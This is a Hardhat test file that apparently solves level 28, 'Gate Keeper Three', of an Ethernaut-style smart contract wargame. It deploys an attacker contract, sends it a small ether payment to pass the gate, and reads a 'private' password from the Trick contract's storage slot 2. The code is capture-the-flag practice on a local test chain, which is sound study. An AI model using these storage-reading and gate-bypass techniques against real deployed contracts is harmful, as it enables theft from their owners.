import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import hre from "hardhat";

import {
  GatekeeperThree,
  GatekeeperThreeFactory,
  GatekeeperThreeFactory__factory,
  GatekeeperThree__factory,
} from "../typechain-types";
import { MyGateKeeperThreeAttack, MyGateKeeperThreeAttack__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("28. Gate Keeper Three", function () {
  let context: FixtureContext;
  let level: FixtureLevel<GatekeeperThreeFactory, GatekeeperThree>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, GatekeeperThreeFactory__factory, (address, signer) =>
      GatekeeperThree__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully through attacker contract", async function () {
    // deploy attacker contract
    const attackFactory: MyGateKeeperThreeAttack__factory = new MyGateKeeperThreeAttack__factory(context.player);
    const attackContract: MyGateKeeperThreeAttack = await attackFactory.deploy();
    await attackContract.waitForDeployment();

    // attack
    const tx = await attackContract.enter(level.instance, {
      value: hre.ethers.parseUnits("0.0011", "ether"),
    });
    const rcpt = await tx.wait();
    if (!rcpt) {
      throw Error("Receipt is empty.");
    }

    // read password from Trick contract
    const passwordSlot = 2;
    const password = await hre.ethers.provider.getStorage(await level.instance.trick(), passwordSlot);
    expect((await rcpt.getBlock()).timestamp).to.be.eq(BigInt(password));

    await completeLevel(context, level);
  });
});
